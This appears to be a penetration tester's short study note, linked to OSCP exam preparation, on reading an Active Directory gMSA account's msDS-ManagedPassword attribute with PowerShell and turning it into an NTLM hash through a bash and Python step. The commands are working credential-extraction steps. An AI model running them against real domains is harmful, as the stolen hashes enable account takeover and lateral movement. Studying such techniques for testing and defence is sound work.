# decode GMSA NTLM hash

- get hex string
```powershell
$gmsa = Get-ADServiceAccount -Identity GMSAccount -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
echo $mp
```
- convert
```bash
# managed_password is the output of `echo $mp`
cat managed_password | awk '{ printf("%.2x", $1) }' > managed_password.hex
~/kb/hacking/windows/convert-msds-managed-password-to-ntlm-hash.py
```

` zet/20221003151133/README.md `

# Related

- [20221014185654](/zet/20221014185654/README.md) kb file named kb/hacking/windows/windows-active-directory-and-privilege-information.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003151134](/zet/20221003151134/README.md) active directory  GMSA group managed service account
- ~/kb/hacking/windows/windows-active-directory-and-privilege-information.md

Tags:

    #hacking #windows #ad #password #powershell #python
